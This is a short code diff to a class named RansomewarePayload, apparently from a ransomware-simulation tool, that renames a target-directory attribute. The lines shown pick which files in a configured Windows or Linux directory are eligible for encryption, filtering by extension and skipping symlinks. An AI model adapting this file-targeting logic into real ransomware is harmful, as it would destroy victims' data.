@@ -23,7 +23,7 @@ class RansomewarePayload:
         LOG.info(f"Windows dir configured for encryption is {config['windows_dir']}")
         LOG.info(f"Linux dir configured for encryption is {config['linux_dir']}")
 
-        self.target_dir = Path(config["windows_dir"] if is_windows_os() else config["linux_dir"])
+        self._target_dir = Path(config["windows_dir"] if is_windows_os() else config["linux_dir"])
         self._valid_file_extensions_for_encryption = VALID_FILE_EXTENSIONS_FOR_ENCRYPTION.copy()
         self._valid_file_extensions_for_encryption.discard(EXTENSION)
 
@@ -38,7 +38,7 @@ class RansomewarePayload:
             is_not_symlink_filter,
         ]
 
-        all_files = get_all_regular_files_in_directory(self.target_dir)
+        all_files = get_all_regular_files_in_directory(self._target_dir)
         return filter_files(all_files, file_filters)
 
     def _encrypt_files(self, file_list):
